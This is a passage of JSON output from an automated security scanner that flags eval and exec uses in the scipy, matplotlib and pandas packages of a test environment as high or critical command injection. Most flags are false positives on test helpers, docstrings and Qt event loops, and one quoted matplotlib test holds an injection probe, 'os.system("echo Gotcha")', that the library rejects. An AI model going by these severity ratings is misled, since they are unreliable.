            "context": "        p = NdPPoly(c, (x, y, z, u))\n        v1 = p((xi, yi, zi, ui))\n\n        v2 = _ppoly4d_eval(c, (x, y, z, u), xi, yi, zi, ui)\n        xp_assert_close(v1, v2)\n\n    def test_deriv_1d(self):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/interpolate/tests/test_interpolate.py",
            "line": 2468,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def _ppoly2d_eval(c, xs, xnew, ynew, nu=None):",
            "context": "        return poch(y - n + 1, n) * x**(y - n)\n\n\ndef _ppoly2d_eval(c, xs, xnew, ynew, nu=None):\n    \"\"\"\n    Straightforward evaluation of 2-D piecewise polynomial\n    \"\"\"",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/interpolate/tests/test_interpolate.py",
            "line": 2504,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def _ppoly3d_eval(c, xs, xnew, ynew, znew, nu=None):",
            "context": "    return out\n\n\ndef _ppoly3d_eval(c, xs, xnew, ynew, znew, nu=None):\n    \"\"\"\n    Straightforward evaluation of 3-D piecewise polynomial\n    \"\"\"",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/interpolate/tests/test_interpolate.py",
            "line": 2544,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def _ppoly4d_eval(c, xs, xnew, ynew, znew, unew, nu=None):",
            "context": "    return out\n\n\ndef _ppoly4d_eval(c, xs, xnew, ynew, znew, unew, nu=None):\n    \"\"\"\n    Straightforward evaluation of 4-D piecewise polynomial\n    \"\"\"",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/interpolate/tests/test_bsplines.py",
            "line": 122,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def test_rndm_naive_eval(self):",
            "context": "        xp_assert_close(splev(xx, (t, c, k)),\n                        bspl(xx), atol=1e-14)\n\n    def test_rndm_naive_eval(self):\n        # test random coefficient spline *on the base interval*,\n        # t[k] <= x < t[-k-1]\n        b = _make_random_spline()",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/interpolate/tests/test_bsplines.py",
            "line": 130,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "y_n = [_naive_eval(x, t, c, k) for x in xx]",
            "context": "        xx = np.linspace(t[k], t[-k-1], 50)\n        y_b = b(xx)\n\n        y_n = [_naive_eval(x, t, c, k) for x in xx]\n        xp_assert_close(y_b, y_n, atol=1e-14)\n\n        y_n2 = [_naive_eval_2(x, t, c, k) for x in xx]",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/interpolate/tests/test_bsplines.py",
            "line": 860,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def _naive_eval(x, t, c, k):",
            "context": "\n\n### stolen from @pv, verbatim\ndef _naive_eval(x, t, c, k):\n    \"\"\"\n    Naive B-spline evaluation. Useful only for testing!\n    \"\"\"",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/interpolate/tests/test_bsplines.py",
            "line": 1320,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "b1 = np.vectorize(lambda x: _naive_eval(x, t, c, k))",
            "context": "        b = make_interp_spline(self.xx, self.yy, k=k, bc_type='periodic')\n        t = _periodic_knots(self.xx, k)\n        c = _make_interp_per_full_matr(self.xx, self.yy, t, k)\n        b1 = np.vectorize(lambda x: _naive_eval(x, t, c, k))\n        xp_assert_close(b(self.xx), b1(self.xx), atol=1e-14)\n\n    def test_quadratic_deriv(self):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/spatial/tests/test_distance.py",
            "line": 444,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "cdist(X1, X2, metric=eval(metric), **kwargs)",
            "context": "                cdist(X1, X2, metric=metric, **kwargs)\n        with pytest.raises(TypeError):\n            with maybe_deprecated(metric):\n                cdist(X1, X2, metric=eval(metric), **kwargs)\n        with pytest.raises(TypeError):\n            with maybe_deprecated(metric):\n                cdist(X1, X2, metric=\"test_\" + metric, **kwargs)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/spatial/tests/test_distance.py",
            "line": 451,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "cdist(X1, X2, metric=eval(metric), *args)",
            "context": "        with pytest.raises(TypeError):\n            cdist(X1, X2, metric=metric, *args)\n        with pytest.raises(TypeError):\n            cdist(X1, X2, metric=eval(metric), *args)\n        with pytest.raises(TypeError):\n            cdist(X1, X2, metric=\"test_\" + metric, *args)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/spatial/tests/test_distance.py",
            "line": 558,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "y2 = cdist(X1, X2, metric=eval(metric), **kwargs)",
            "context": "        # helper function for test_cdist_calling_conventions\n        try:\n            y1 = cdist(X1, X2, metric=metric, **kwargs)\n            y2 = cdist(X1, X2, metric=eval(metric), **kwargs)\n            y3 = cdist(X1, X2, metric=\"test_\" + metric, **kwargs)\n        except Exception as e:\n            e_cls = e.__class__",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/spatial/tests/test_distance.py",
            "line": 568,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "cdist(X1, X2, metric=eval(metric), **kwargs)",
            "context": "            with pytest.raises(e_cls):\n                cdist(X1, X2, metric=metric, **kwargs)\n            with pytest.raises(e_cls):\n                cdist(X1, X2, metric=eval(metric), **kwargs)\n            with pytest.raises(e_cls):\n                cdist(X1, X2, metric=\"test_\" + metric, **kwargs)\n        else:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/spatial/tests/test_distance.py",
            "line": 753,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pdist(X1, metric=eval(metric), **kwargs)",
            "context": "                pdist(X1, metric=metric, **kwargs)\n        with pytest.raises(TypeError):\n            with maybe_deprecated(metric):\n                pdist(X1, metric=eval(metric), **kwargs)\n        with pytest.raises(TypeError):\n            with maybe_deprecated(metric):\n                pdist(X1, metric=\"test_\" + metric, **kwargs)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/spatial/tests/test_distance.py",
            "line": 760,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pdist(X1, metric=eval(metric), *args)",
            "context": "        with pytest.raises(TypeError):\n            pdist(X1, metric=metric, *args)\n        with pytest.raises(TypeError):\n            pdist(X1, metric=eval(metric), *args)\n        with pytest.raises(TypeError):\n            pdist(X1, metric=\"test_\" + metric, *args)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/spatial/tests/test_distance.py",
            "line": 1391,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "y2 = pdist(X, metric=eval(metric), **kwargs)",
            "context": "        # helper function for test_pdist_calling_conventions\n        try:\n            y1 = pdist(X, metric=metric, **kwargs)\n            y2 = pdist(X, metric=eval(metric), **kwargs)\n            y3 = pdist(X, metric=\"test_\" + metric, **kwargs)\n        except Exception as e:\n            e_cls = e.__class__",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/spatial/tests/test_distance.py",
            "line": 1401,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "pdist(X, metric=eval(metric), **kwargs)",
            "context": "            with pytest.raises(e_cls):\n                pdist(X, metric=metric, **kwargs)\n            with pytest.raises(e_cls):\n                pdist(X, metric=eval(metric), **kwargs)\n            with pytest.raises(e_cls):\n                pdist(X, metric=\"test_\" + metric, **kwargs)\n        else:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/spatial/tests/test_distance.py",
            "line": 2134,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "for m in [metric, eval(metric), \"test_\" + metric]:",
            "context": "    if metric in ['seuclidean', 'mahalanobis', 'jensenshannon']:\n        pytest.skip(\"not applicable\")\n\n    for m in [metric, eval(metric), \"test_\" + metric]:\n        with pytest.raises(ValueError):\n            with maybe_deprecated(metric):\n                pdist(X, m, w=w)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/tests/test_patches.py",
            "line": 475,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "str(eval(str(p))) == str(p)",
            "context": "    Check that patches have nice and working `str` representation.\n\n    Note that the logic is that `__str__` is defined such that:\n    str(eval(str(p))) == str(p)\n    \"\"\"\n    p = mpatches.Circle(xy=(1, 2), radius=3)\n    assert str(p) == 'Circle(xy=(1, 2), radius=3)'",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/tests/test_pickle.py",
            "line": 164,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "loaded_fig = pickle.loads(ast.literal_eval(proc.stdout))",
            "context": "        },\n    )\n\n    loaded_fig = pickle.loads(ast.literal_eval(proc.stdout))\n\n    loaded_fig.canvas.draw()\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/tests/test_rcparams.py",
            "line": 299,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "('os.system(\"echo Gotcha\")', ValueError),  # os not available",
            "context": "                  (\"cycler('c', [j.__class__(j).lower() for j in ['r', 'b']])\",\n                   ValueError),\n                  ('1 + 2', ValueError),  # doesn't produce a Cycler object\n                  ('os.system(\"echo Gotcha\")', ValueError),  # os not available\n                  ('import os', ValueError),  # should not be able to import\n                  ('def badjuju(a): return a; badjuju(cycler(\"color\", \"rgb\"))',\n                   ValueError),  # Should not be able to define anything",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/tests/test_transforms.py",
            "line": 868,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert_bbox_eq(b, eval(repr(b), {'Bbox': mtransforms.Bbox}))",
            "context": "\ndef test_bbox_as_strings():\n    b = mtransforms.Bbox([[.5, 0], [.75, .75]])\n    assert_bbox_eq(b, eval(repr(b), {'Bbox': mtransforms.Bbox}))\n    asdict = eval(str(b), {'Bbox': dict})\n    for k, v in asdict.items():\n        assert getattr(b, k) == v",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/tests/test_transforms.py",
            "line": 869,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "asdict = eval(str(b), {'Bbox': dict})",
            "context": "def test_bbox_as_strings():\n    b = mtransforms.Bbox([[.5, 0], [.75, .75]])\n    assert_bbox_eq(b, eval(repr(b), {'Bbox': mtransforms.Bbox}))\n    asdict = eval(str(b), {'Bbox': dict})\n    for k, v in asdict.items():\n        assert getattr(b, k) == v\n    fmt = '.1f'",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/tests/test_transforms.py",
            "line": 873,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "asdict = eval(format(b, fmt), {'Bbox': dict})",
            "context": "    for k, v in asdict.items():\n        assert getattr(b, k) == v\n    fmt = '.1f'\n    asdict = eval(format(b, fmt), {'Bbox': dict})\n    for k, v in asdict.items():\n        assert eval(format(getattr(b, k), fmt)) == v\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/tests/test_transforms.py",
            "line": 875,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert eval(format(getattr(b, k), fmt)) == v",
            "context": "    fmt = '.1f'\n    asdict = eval(format(b, fmt), {'Bbox': dict})\n    for k, v in asdict.items():\n        assert eval(format(getattr(b, k), fmt)) == v\n\n\ndef test_str_transform():",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/plot_directive.py",
            "line": 543,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec('import numpy as np\\n'",
            "context": "                ns = {}\n            if not ns:\n                if setup.config.plot_pre_code is None:\n                    exec('import numpy as np\\n'\n                         'from matplotlib import pyplot as plt\\n', ns)\n                else:\n                    exec(str(setup.config.plot_pre_code), ns)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/plot_directive.py",
            "line": 546,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(str(setup.config.plot_pre_code), ns)",
            "context": "                    exec('import numpy as np\\n'\n                         'from matplotlib import pyplot as plt\\n', ns)\n                else:\n                    exec(str(setup.config.plot_pre_code), ns)\n            if \"__main__\" in code:\n                ns['__name__'] = '__main__'\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/plot_directive.py",
            "line": 552,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(code, ns)",
            "context": "\n            # Patch out non-interactive show() to avoid triggering a warning.\n            with cbook._setattr_cm(FigureManagerBase, show=lambda self: None):\n                exec(code, ns)\n                if function_name is not None:\n                    exec(function_name + \"()\", ns)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/plot_directive.py",
            "line": 554,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "exec(function_name + \"()\", ns)",
            "context": "            with cbook._setattr_cm(FigureManagerBase, show=lambda self: None):\n                exec(code, ns)\n                if function_name is not None:\n                    exec(function_name + \"()\", ns)\n\n        except (Exception, SystemExit) as err:\n            raise PlotError(traceback.format_exc()) from err",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/backends/qt_compat.py",
            "line": 157,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def _exec(obj):",
            "context": "# Backports.\n\n\ndef _exec(obj):\n    # exec on PyQt6, exec_ elsewhere.\n    obj.exec() if hasattr(obj, \"exec\") else obj.exec_()\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/backends/qt_compat.py",
            "line": 159,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "obj.exec() if hasattr(obj, \"exec\") else obj.exec_()",
            "context": "\ndef _exec(obj):\n    # exec on PyQt6, exec_ elsewhere.\n    obj.exec() if hasattr(obj, \"exec\") else obj.exec_()\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/backends/backend_qt.py",
            "line": 462,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "qt_compat._exec(event_loop)",
            "context": "            _ = QtCore.QTimer.singleShot(int(timeout * 1000), event_loop.quit)\n\n        with _allow_interrupt_qt(event_loop):\n            qt_compat._exec(event_loop)\n\n    def stop_event_loop(self, event=None):\n        # docstring inherited",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/backends/backend_qt.py",
            "line": 643,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "qt_compat._exec(qapp)",
            "context": "        qapp = QtWidgets.QApplication.instance()\n        if qapp:\n            with _allow_interrupt_qt(qapp):\n                qt_compat._exec(qapp)\n\n    def show(self):\n        self.window._destroying = False",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/backends/qt_editor/_formlayout.py",
            "line": 355,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "value = literal_eval(str(field.text()))",
            "context": "                else:\n                    value = date_.toPython()\n            else:\n                value = literal_eval(str(field.text()))\n            valuelist.append(value)\n        return valuelist\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/backends/qt_editor/_formlayout.py",
            "line": 576,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "_app.exec()",
            "context": "          comment=\"This is just an <b>example</b>.\",\n          apply=apply_test)\n\n    _app.exec()\n\n    # --------- datagroup example\n    datagroup = create_datagroup_example()",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/backends/qt_editor/_formlayout.py",
            "line": 582,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "_app.exec()",
            "context": "    datagroup = create_datagroup_example()\n    fedit(datagroup, \"Global title\",\n          apply=apply_test)\n    _app.exec()\n\n    # --------- datagroup inside a datagroup example\n    datalist = create_datalist_example()",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/backends/qt_editor/_formlayout.py",
            "line": 592,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "_app.exec()",
            "context": "           (datalist, \"Title 3\", \"Tab 3 comment\")),\n          \"Global title\",\n          apply=apply_test)\n    _app.exec()\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/frame.py",
            "line": 4828,
            "severity": "CRITICAL",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "res = self.eval(expr, **kwargs)",
            "context": "            raise ValueError(msg)\n        kwargs[\"level\"] = kwargs.pop(\"level\", 0) + 1\n        kwargs[\"target\"] = None\n        res = self.eval(expr, **kwargs)\n\n        try:\n            result = self.loc[res]",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/frame.py",
            "line": 4844,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def eval(self, expr: str, *, inplace: Literal[False] = ..., **kwargs) -> Any:",
            "context": "            return result\n\n    @overload\n    def eval(self, expr: str, *, inplace: Literal[False] = ..., **kwargs) -> Any:\n        ...\n\n    @overload",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/frame.py",
            "line": 4848,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def eval(self, expr: str, *, inplace: Literal[True], **kwargs) -> None:",
            "context": "        ...\n\n    @overload\n    def eval(self, expr: str, *, inplace: Literal[True], **kwargs) -> None:\n        ...\n\n    def eval(self, expr: str, *, inplace: bool = False, **kwargs) -> Any | None:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/frame.py",
            "line": 4851,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "def eval(self, expr: str, *, inplace: bool = False, **kwargs) -> Any | None:",
            "context": "    def eval(self, expr: str, *, inplace: Literal[True], **kwargs) -> None:\n        ...\n\n    def eval(self, expr: str, *, inplace: bool = False, **kwargs) -> Any | None:\n        \"\"\"\n        Evaluate a string describing operations on DataFrame columns.\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/frame.py",
            "line": 4902,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> df.eval('A + B')",
            "context": "        2  3   6\n        3  4   4\n        4  5   2\n        >>> df.eval('A + B')\n        0    11\n        1    10\n        2     9",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/frame.py",
            "line": 4913,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> df.eval('C = A + B')",
            "context": "        Assignment is allowed though by default the original DataFrame is not\n        modified.\n\n        >>> df.eval('C = A + B')\n           A   B   C\n        0  1  10  11\n        1  2   8  10",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/frame.py",
            "line": 4930,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> df.eval(",
            "context": "\n        Multiple columns can be assigned to using multi-line expressions:\n\n        >>> df.eval(\n        ...     '''\n        ... C = A + B\n        ... D = A - B",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/frame.py",
            "line": 4954,
            "severity": "CRITICAL",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return _eval(expr, inplace=inplace, **kwargs)",
            "context": "            kwargs[\"target\"] = self\n        kwargs[\"resolvers\"] = tuple(kwargs.get(\"resolvers\", ())) + resolvers\n\n        return _eval(expr, inplace=inplace, **kwargs)\n\n    def select_dtypes(self, include=None, exclude=None) -> Self:\n        \"\"\"",
            "cvss_score": 9.8
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/errors/__init__.py",
            "line": 567,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> pd.eval(\"sin + a\", engine='numexpr') # doctest: +SKIP",
            "context": "    >>> df.query(\"abs > 2\") # doctest: +SKIP\n    ... # NumExprClobberingError: Variables in expression \"(abs) > (2)\" overlap...\n    >>> sin, a = 1, 2\n    >>> pd.eval(\"sin + a\", engine='numexpr') # doctest: +SKIP\n    ... # NumExprClobberingError: Variables in expression \"(sin) + (a)\" overlap...\n    \"\"\"\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/errors/__init__.py",
            "line": 585,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": ">>> pd.eval('x + 1') # doctest: +SKIP",
            "context": "    ... # UndefinedVariableError: name 'x' is not defined\n    >>> df.query(\"A > @y\") # doctest: +SKIP\n    ... # UndefinedVariableError: local variable 'y' is not defined\n    >>> pd.eval('x + 1') # doctest: +SKIP\n    ... # UndefinedVariableError: name 'x' is not defined\n    \"\"\"\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/indexes/test_old_base.py",
            "line": 238,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "tm.assert_index_equal(eval(repr(idx)), idx)",
            "context": "        if isinstance(simple_index, IntervalIndex):\n            pytest.skip(f\"Not a valid repr for {type(simple_index).__name__}\")\n        idx = simple_index\n        tm.assert_index_equal(eval(repr(idx)), idx)\n\n    def test_repr_max_seq_item_setting(self, simple_index):\n        # GH10182",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 60,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = df.eval(\"A+1\")",
            "context": "        # this should always work, whether NUMEXPR_INSTALLED or not\n        result = df.query(\"A>0\")\n        tm.assert_frame_equal(result, expected1)\n        result = df.eval(\"A+1\")\n        tm.assert_series_equal(result, expected2, check_names=False)\n\n    def test_query_None(self, df, expected1, expected2):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 66,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = df.eval(\"A+1\", engine=None)",
            "context": "    def test_query_None(self, df, expected1, expected2):\n        result = df.query(\"A>0\", engine=None)\n        tm.assert_frame_equal(result, expected1)\n        result = df.eval(\"A+1\", engine=None)\n        tm.assert_series_equal(result, expected2, check_names=False)\n\n    def test_query_python(self, df, expected1, expected2):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 72,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = df.eval(\"A+1\", engine=\"python\")",
            "context": "    def test_query_python(self, df, expected1, expected2):\n        result = df.query(\"A>0\", engine=\"python\")\n        tm.assert_frame_equal(result, expected1)\n        result = df.eval(\"A+1\", engine=\"python\")\n        tm.assert_series_equal(result, expected2, check_names=False)\n\n    def test_query_numexpr(self, df, expected1, expected2):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 79,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = df.eval(\"A+1\", engine=\"numexpr\")",
            "context": "        if NUMEXPR_INSTALLED:\n            result = df.query(\"A>0\", engine=\"numexpr\")\n            tm.assert_frame_equal(result, expected1)\n            result = df.eval(\"A+1\", engine=\"numexpr\")\n            tm.assert_series_equal(result, expected2, check_names=False)\n        else:\n            msg = (",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 90,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "df.eval(\"A+1\", engine=\"numexpr\")",
            "context": "            with pytest.raises(ImportError, match=msg):\n                df.query(\"A>0\", engine=\"numexpr\")\n            with pytest.raises(ImportError, match=msg):\n                df.eval(\"A+1\", engine=\"numexpr\")\n\n\nclass TestDataFrameEval:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 117,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "expected = eval(f\"base {op_str} df\")",
            "context": "            np.tile(m.values, n).reshape(n, -1), columns=list(\"abcd\")\n        )\n\n        expected = eval(f\"base {op_str} df\")\n\n        # ops as strings\n        result = eval(f\"m {op_str} df\")",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 120,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = eval(f\"m {op_str} df\")",
            "context": "        expected = eval(f\"base {op_str} df\")\n\n        # ops as strings\n        result = eval(f\"m {op_str} df\")\n        tm.assert_frame_equal(result, expected)\n\n        # these are commutative",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 168,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert df.eval(\"a + b\", resolvers=[dict1, dict2]) == dict1[\"a\"] + dict2[\"b\"]",
            "context": "        )\n        dict1 = {\"a\": 1}\n        dict2 = {\"b\": 2}\n        assert df.eval(\"a + b\", resolvers=[dict1, dict2]) == dict1[\"a\"] + dict2[\"b\"]\n        assert pd.eval(\"a + b\", resolvers=[dict1, dict2]) == dict1[\"a\"] + dict2[\"b\"]\n\n    def test_eval_resolvers_combined(self):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 169,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "assert pd.eval(\"a + b\", resolvers=[dict1, dict2]) == dict1[\"a\"] + dict2[\"b\"]",
            "context": "        dict1 = {\"a\": 1}\n        dict2 = {\"b\": 2}\n        assert df.eval(\"a + b\", resolvers=[dict1, dict2]) == dict1[\"a\"] + dict2[\"b\"]\n        assert pd.eval(\"a + b\", resolvers=[dict1, dict2]) == dict1[\"a\"] + dict2[\"b\"]\n\n    def test_eval_resolvers_combined(self):\n        # GH 34966",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/frame/test_query_eval.py",
            "line": 179,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "result = df.eval(\"a + b * c\", resolvers=[dict1])",
            "context": "        dict1 = {\"c\": 2}\n\n        # Both input and default index/column resolvers should be usable\n        result = df.eval(\"a + b * c\", resolvers=[dict1])\n\n        expected = df[\"a\"] + df[\"b\"] * dict1[\"c\"]\n        tm.assert_series_equal(result, expected)",
            "cvss_score": 7.5
          },
          {
